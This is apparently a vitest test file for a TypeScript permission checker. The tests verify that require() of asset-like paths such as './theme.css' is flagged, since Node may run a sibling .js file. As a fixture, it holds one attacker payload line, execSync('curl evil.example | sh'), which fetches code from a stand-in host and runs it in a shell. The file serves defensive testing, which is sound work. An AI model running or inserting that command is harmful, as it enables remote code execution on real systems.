// Loading a file that looks like an asset: a stylesheet, an image, JSON. A bundler (or
// Node's ES module loader) loads it as what it is, but Node's require() runs every file
// except a .json one as JavaScript, and adds `.js` to a path that doesn't exist:
// `require("./theme.css")` runs ./theme.css, or ./theme.css.js. TypeScript compiles a
// file's imports into require() calls when it emits CommonJS, so the module settings
// decide which specifiers name data.

import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { afterAll, describe, expect, it } from "vitest";
import { checkTsConfig, type Report } from "../src/check.js";
import { removeTemporary } from "./temporary.js";

const typeRoots = [fileURLToPath(new URL("../node_modules/@types", import.meta.url))];
const dirs: string[] = [];

afterAll(() => {
  for (const dir of dirs) removeTemporary(dir);
});

/**
 * Checks `files` with these module settings, at production strictness so every function counts.
 * `<dir>` in a file stands for the project's folder.
 */
function check(compilerOptions: Record<string, unknown>, files: Record<string, string>): Report {
  const dir = mkdtempSync(path.join(tmpdir(), "permlang-modules-"));
  dirs.push(dir);
  const tsconfig = { compilerOptions: { target: "ES2022", strict: true, types: ["node"], typeRoots, ...compilerOptions }, include: ["src"] };
  for (const [file, text] of Object.entries({ "tsconfig.json": JSON.stringify(tsconfig), ...files })) {
    mkdirSync(path.dirname(path.join(dir, file)), { recursive: true });
    writeFileSync(path.join(dir, file), text.replaceAll("<dir>", dir.replaceAll(path.sep, "/")));
  }
  return checkTsConfig(path.join(dir, "tsconfig.json"), { strictness: "production" });
}

/** Each diagnostic as `file:line severity code capability`. */
const diagnostics = (report: Report) => report.diagnostics.map((d) => `${path.basename(d.file)}:${d.line} ${d.severity} ${d.code} ${d.capability}`);

// What an attacker adds next to the asset's name: Node runs it when the asset doesn't exist.
const payload = 'require("child_process").execSync("curl evil.example | sh");\n';

const COMMONJS = { module: "commonjs", moduleResolution: "node10" };
const BUNDLER = { module: "esnext", moduleResolution: "bundler" };
const NODENEXT = { module: "nodenext", moduleResolution: "nodenext" };

describe("require() of a file that looks like an asset", () => {
  it("is unverifiable, unless it's a .json file that exists", () => {
    const report = check(COMMONJS, {
      "src/theme.css.js": payload,
      "src/missing.json.js": payload,
      "src/data.json": '{ "a": 1 }',
      "src/upper.JSON": payload,
      "src/a.ts": [
        "/** @perm env(NONE) */ export function style() { return require(\"./theme.css\"); }",
        "/** @perm env(NONE) */ export function missing() { return require(\"./missing.json\"); }",
        "/** @perm env(NONE) */ export function data() { return require(\"./data.json\"); }",
        // Node picks the loader by the exact extension, so this runs as JavaScript.
        "/** @perm env(NONE) */ export function upper() { return require(\"./upper.JSON\"); }",
        // A query string is part of the file name for require().
        "/** @perm env(NONE) */ export function query() { return require(\"./data.json?raw\"); }",
      ].join("\n"),
    });
    expect(diagnostics(report)).toEqual([
      "a.ts:1 error PERM004 unverifiable",
      "a.ts:2 error PERM004 unverifiable",
      "a.ts:4 error PERM004 unverifiable",
      "a.ts:5 error PERM004 unverifiable",
    ]);
  });

  it("is the same for an absolute path, and for a package's file", () => {
    const report = check(COMMONJS, {
      "src/data.json": '{ "a": 1 }',
      "node_modules/countries/package.json": JSON.stringify({ name: "countries", main: "index.js" }),
      "node_modules/countries/list.json": "[]",
      "src/a.ts": [
        '/** @perm env(NONE) */ export function absolute() { return require("<dir>/src/data.json"); }',
        '/** @perm env(NONE) */ export function absoluteMissing() { return require("<dir>/src/missing.json"); }',
        '/** @perm env(NONE) */ export function list() { return require("countries/list.json"); }',
        // A package's .json that doesn't exist runs the package's missing.json.js: the package's code.
        '/** @perm env(NONE) */ export function listMissing() { return require("countries/missing.json"); }',
        // A Windows path is a file outside the project, wherever the check runs.
        '/** @perm env(NONE) */ export function windows() { return require("C:/tools/setup.js"); }',
      ].join("\n"),
    });
    expect(diagnostics(report)).toEqual(["a.ts:2 error PERM004 unverifiable", "a.ts:4 warning PERM006 countries", "a.ts:5 error PERM004 unverifiable"]);
  });

  it("is the same in an ES module, through createRequire", () => {
    const report = check(BUNDLER, {
      "src/a.ts": [
        'import { createRequire } from "node:module";',
        "const load = createRequire(import.meta.url);",
        "/** @perm env(NONE) */ export function style() { return load(\"./theme.css\"); }",
      ].join("\n"),
    });
    expect(diagnostics(report)).toEqual(["a.ts:3 error PERM004 unverifiable"]);
  });
});

describe("importing a file that looks like an asset", () => {
  // These imports compile to require(), so they're imports whose types can't be found (PERM007).
  it("is reported where TypeScript compiles it to require()", () => {
    const report = check(COMMONJS, {
      "src/theme.css.js": payload,
      "src/data.json": '{ "a": 1 }',
      "src/a.ts": [
        'import "./theme.css";',
        'import logo = require("./logo.svg");',
        'import data from "./data.json";',
        "/** @perm env(NONE) */ export async function later() { return [logo, data, await import(\"./later.css\")]; }",
      ].join("\n"),
    });
    expect(diagnostics(report)).toEqual([
      "a.ts:1 warning PERM007 ./theme.css",
      "a.ts:2 warning PERM007 ./logo.svg",
      "a.ts:4 warning PERM007 ./later.css",
    ]);
    expect(report.diagnostics[0]!.fix).toBe(
      "make sure the file exists and has types (a .ts file, or a .d.ts next to it). Where imports compile to require(), anything but a .json file that exists runs as JavaScript.",
    );
  });

  it("is reported in Node's CommonJS files: a package that isn't an ES module, and .cts files", () => {
    const commonjs = check(NODENEXT, { "package.json": "{}", "src/a.ts": 'import "./theme.css";\nexport {};\n' });
    expect(diagnostics(commonjs)).toEqual(["a.ts:1 warning PERM007 ./theme.css"]);
    const cts = check(NODENEXT, { "package.json": JSON.stringify({ type: "module" }), "src/a.cts": 'import "./theme.css";\nexport {};\n' });
    expect(diagnostics(cts)).toEqual(["a.cts:1 warning PERM007 ./theme.css"]);
    const bundled = check(BUNDLER, { "src/a.cts": 'import "./theme.css";\nexport {};\n' });
    expect(diagnostics(bundled)).toEqual(["a.cts:1 warning PERM007 ./theme.css"]);
  });

  it("follows TypeScript's defaults: an .mts file is an ES module, and \"module\" follows the target", () => {
    const asset = 'import "./theme.css";\nexport {};\n';
    // TypeScript emits an .mts file as an ES module even where "module" is CommonJS.
    expect(diagnostics(check(COMMONJS, { "src/a.mts": asset }))).toEqual([]);
    // With no "module", an ES2015 or later target means ES modules, and an older one CommonJS.
    expect(diagnostics(check({}, { "src/a.ts": asset }))).toEqual([]);
    expect(diagnostics(check({ target: "ES5" }, { "src/a.ts": asset }))).toEqual(["a.ts:1 warning PERM007 ./theme.css"]);
    // With neither, the target is ES5 too.
    expect(diagnostics(check({ target: undefined }, { "src/a.ts": asset }))).toEqual(["a.ts:1 warning PERM007 ./theme.css"]);
  });

  it("isn't reported in an ES module, where a bundler (or Node, which won't run it) loads it", () => {
    const files = {
      "src/theme.css.js": payload,
      "src/assets.d.ts": 'declare module "*.svg" { const url: string; export default url; }\n',
      "src/a.ts": [
        'import "./theme.css";',
        'import "./theme.css?inline";',
        'import logo from "./logo.svg";',
        'export { default as icon } from "./icon.svg";',
        "/** @perm env(NONE) */ export async function later() { return [logo, await import(\"./later.css\")]; }",
      ].join("\n"),
    };
    expect(diagnostics(check(BUNDLER, files))).toEqual([]);
    expect(diagnostics(check({ module: "preserve", moduleResolution: "bundler" }, files))).toEqual([]);
    expect(diagnostics(check(NODENEXT, { ...files, "package.json": JSON.stringify({ type: "module" }) }))).toEqual([]);
    // In Node's CommonJS files, a dynamic import() stays import(), so it loads data.
    expect(diagnostics(check(NODENEXT, { "package.json": "{}", "src/a.ts": "/** @perm env(NONE) */ export async function later() { return import(\"./later.css\"); }\n" }))).toEqual([]);
  });

  it("is reported through `import x = require()` even in an ES module", () => {
    const report = check({ module: "preserve", moduleResolution: "bundler" }, { "src/a.ts": 'import logo = require("./logo.svg");\nexport { logo };\n' });
    expect(diagnostics(report)).toEqual(["a.ts:1 warning PERM007 ./logo.svg"]);
  });
});
